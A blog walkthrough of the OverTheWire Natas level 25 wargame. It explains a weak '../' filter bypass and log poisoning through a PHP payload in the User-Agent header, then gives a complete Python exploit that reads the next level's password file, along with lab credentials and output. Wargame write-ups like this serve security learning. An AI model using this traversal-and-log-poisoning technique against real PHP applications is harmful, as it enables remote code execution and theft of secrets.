---
layout: post-with-comments
title: "OverTheWire Natas Level 24 → 25 tutorial!!"
permalink: /posts/overTheWire-Natas-Level-24-to-25/
tags: [overthewire, natas, walkthrough, ctf, web, beginner, php, lfi, log-poisoning, python, requests]
description: "A step by step tutorial for OverTheWire Natas Level 24 → 25 — Python-only exploit!"
---

<!-- Scoped styles: only affect this post -->
<style>
  .bandit-nav{display:flex;align-items:center;gap:.75rem;margin:.5rem 0 1.25rem;border-top:1px solid var(--border-color,#3a3a3a);padding-top:.75rem}
  .bandit-nav .nav-left,.bandit-nav .nav-center,.bandit-nav .nav-right{flex:1}
  .bandit-nav .nav-left{text-align:left}
  .bandit-nav .nav-center{text-align:center}
  .bandit-nav .nav-right{text-align:right}
  .bandit-nav a{display:inline-block;padding:.45rem .8rem;border:1px solid var(--border-color,#3a3a3a);border-radius:.6rem;text-decoration:none;line-height:1}
  .bandit-nav a:hover{transform:translateY(-1px)}
  .bandit-nav .disabled{opacity:.55}
  :root[data-theme='light'] .bandit-nav a{border-color:rgba(0,0,0,.15)}
  code{white-space:pre-wrap}
</style>

<nav class="bandit-nav" aria-label="Natas level navigation">
  <div class="nav-left">
    <a href="{{ '/posts/overTheWire-Natas-Level-23-to-24/' | relative_url }}">← Previous: Level 23 → 24</a>
  </div>

  <div class="nav-center">
    <a href="https://overthewire.org/wargames/natas/natas25.html" target="_blank" rel="noopener">
      Official (Level 25) ↗
    </a>
  </div>

  <div class="nav-right">
    <a href="{{ '/posts/overTheWire-Natas-Level-25-to-26/' | relative_url }}">
      Next: Level 25 → 26 →
    </a>
  </div>
</nav>

## Login

URL: [http://natas25.natas.labs.overthewire.org](http://natas25.natas.labs.overthewire.org)  

Credentials: **natas25:ckELKUWZUfpOv6uxS6M7lXBpBssJZ4Ws**

```bash
# Quick check:
curl -u natas25:ckELKUWZUfpOv6uxS6M7lXBpBssJZ4Ws 
  http://natas25.natas.labs.overthewire.org/
````

![homepage]({{ '/assets/images/natas/level-24-to-25/homepage.jpg' | relative_url }})

---

## Task

Exploit two weaknesses together:

1. **Weak directory traversal filter** (`str_replace("../","",...)`)
2. **Log poisoning** via the `User-Agent` string

Goal: include our own poisoned log and execute arbitrary PHP to dump the next password.

---

## A little bit of Theory

Relevant source code:

```php
if (strstr($filename,"../")) {
    $filename = str_replace("../","",$filename);
}
...
$log = $log . " " . $_SERVER['HTTP_USER_AGENT'];
$fd = fopen("/var/www/natas/natas25/logs/natas25_" . session_id() . ".log","a");
fwrite($fd,$log);
```

* The traversal check is **naive**: `....//` bypasses it.
* Logs are written under `logs/natas25_<PHPSESSID>.log`.
* Our **User-Agent** is appended to the log → we can inject PHP.

---

## Full Python Exploit

Steps:

1. Start a session → get `PHPSESSID`.
2. **Poison the log**: request with `User-Agent=<?php ... ?>` *and* a traversal param to force `logRequest()`.
3. Include the log file using `lang=....//logs/natas25_<PHPSESSID>.log`.
4. Our PHP executes and prints the password between `PW:...:PW`.

```python
#!/usr/bin/env python3
import re, requests

BASE = "http://natas25.natas.labs.overthewire.org/"
AUTH = ("natas25", "ckELKUWZUfpOv6uxS6M7lXBpBssJZ4Ws")

PAYLOAD = '<?php echo "PW:".file_get_contents("/etc/natas_webpass/natas26").":PW"; ?>'
MARKER = re.compile(r"PW:([A-Za-z0-9]{32}):PW")

with requests.Session() as s:
    s.auth = AUTH

    # Get PHPSESSID
    s.get(BASE)
    sid = s.cookies.get("PHPSESSID")
    print(f"[i] PHPSESSID = {sid}")

    # Poison log (must trigger traversal so logRequest() runs)
    s.get(BASE, params={"lang": "....//dummy"}, headers={"User-Agent": PAYLOAD})

    # Try sibling log include
    lang = f"....//logs/natas25_{sid}.log"
    r = s.get(BASE, params={"lang": lang})

    m = MARKER.search(r.text)
    if not m:
        # Fallback: absolute path with traversal hops
        hop = "....//" * 8
        lang = hop + f"var/www/natas/natas25/logs/natas25_{sid}.log"
        r = s.get(BASE, params={"lang": lang})
        m = MARKER.search(r.text)

    if not m:
        print(r.text[:800])
        raise SystemExit("[-] Password marker not found.")

    print(f"[+] natas26 password = {m.group(1)}")
```

Run:

```bash
python3 natas25_exploit.py
```

Example output:

```
[i] PHPSESSID = e1ci2h8fgj31acafb8ojeamj9f
[+] natas26 password = cVXXwxMS3Y26n5UZU89QgpGmWCelaQlE
```

---

## Password

```
cVXXwxMS3Y26n5UZU89QgpGmWCelaQlE
```

---

## Troubleshooting

* **Still no PW?**

  * Make sure the poison step used both **User-Agent** and `lang=....//dummy`.
* **Markers don’t show up?**

  * Increase hop count (`....//` \* 12).
  * Verify the `sid` matches your current PHPSESSID cookie.
* **Payload echoed literally (not executed)?**

  * You’re not including the log; check `lang` points at `logs/natas25_<sid>.log`.

---

**Boom 🎉** Pure Python `requests` exploit — no Burp needed. On to **natas26**!

---

## Thanks for reading!

Until next time — **Otsumachi!!** 💖☄️✨

![Cinema]({{ '/assets/images/advice/cinema.gif' | relative_url }})

